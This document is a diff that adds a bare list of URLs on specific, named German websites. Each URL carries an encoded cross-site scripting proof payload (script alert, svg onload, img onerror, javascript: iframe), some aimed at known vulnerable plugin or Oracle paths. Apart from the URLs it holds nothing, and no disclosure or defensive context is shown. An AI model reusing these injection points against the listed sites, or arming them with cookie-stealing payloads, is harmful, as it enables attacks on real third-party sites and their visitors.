@@ -1,0 +1,17 @@
+http://hallo-nrw.de/wp-content/plugins/phpfreechat/lib/csstidy-1.2/css_optimiser.php?url=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+http://hamburg-plus.de/index.php/%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E?page=HOME
+http://hamoek.de/pages/includes/status-list-mo%3CIFRAME%20SRC%3D%22javascript%3Aalert%281337%29%22%3E.vm
+http://handwerkverzeichnis.de?lang=%22%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E%3Cp%20class=%22&p=1
+http://hannes-deeken.de/?key=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss%27%29%3E
+http://hardterbroich.immeta.de/printenv.shtml?%3Cscript%3Ealert(%27xss%27)%3C/script%3E
+https://haaren.yooco.de/?rsd=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+https://haar-rundschau.de/query/%3Cimg%20src=x%20onerror=alert(document.domain)%3E/all
+https://hafenstrasse.immeta.de/printenv.shtml?%3Cscript%3Ealert(%27xss%27)%3C/script%3E
+https://hagenow-heute.de/maxsite/page/1%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+https://hagen-tageblatt.de/page/1%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+https://haiger-suche.de/page/1%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+https://hair-beauty-landshut.de/OA_HTML/jtfLOVInProcess.jsp%3FAAA%3DAAAAAAAAAA%27%22%3E%3Csvg%2Fonload%3Dalert('2NTy9IXQs2kLeQAeGDQspAHqVBV')%3E
+https://hajcy.hotels-on-air.de/?key=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss%27%29%3E
+https://halleneustadt-lokal.de/query/%3Cimg%20src=x%20onerror=alert(document.domain)%3E/all
+https://hamminkeln-suche.de/wp-admin/admin.php/%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E/?page=under-construction
+https://hanauammain-blog.de/pages/includes/status-list-mo%3CIFRAME%20SRC%3D%22javascript%3Aalert%281337%29%22%3E.vm
